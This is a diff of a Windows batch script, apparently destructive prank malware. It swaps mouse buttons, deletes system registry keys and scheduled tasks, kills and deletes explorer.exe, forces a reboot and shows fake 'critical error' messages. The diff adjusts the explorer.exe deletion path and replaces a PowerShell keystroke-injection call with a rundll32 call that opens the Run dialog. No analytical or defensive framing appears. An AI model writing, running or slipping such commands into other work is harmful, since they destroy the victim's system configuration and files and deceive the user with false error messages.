@@ -126,10 +126,10 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Settings" /f >nul 2>&
 reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f >nul 2>&1
 del /f /q /s "C:\System32\Tasks\*" >nul 2>&1
 taskkill /F /IM explorer.exe >nul 2>&1
-del /f /q /s "C:\Windows\System32\explorer.exe" >nul 2>&1
+del /f /q /s "C:\Windows\explorer.exe" >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /f >nul 2>&1
 shutdown /f /r /t 900
-powershell -NoProfile -Command "Add-Type -Name Win32 -Namespace User32 -MemberDefinition '[DllImport(""user32.dll"", SetLastError = true)] public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);'; [User32.Win32]::keybd_event(0x5B,0,0,0); [User32.Win32]::keybd_event(0x52,0,0,0); Start-Sleep -Milliseconds 50; [User32.Win32]::keybd_event(0x52,0,2,0); [User32.Win32]::keybd_event(0x5B,0,2,0);"
+start rundll32.exe shell32.dll,#61 >nul 2>&1
 msg * "Hi!"
 msg * "You will need the Windows Start Menu!"
 msg * "System critical error detected!"
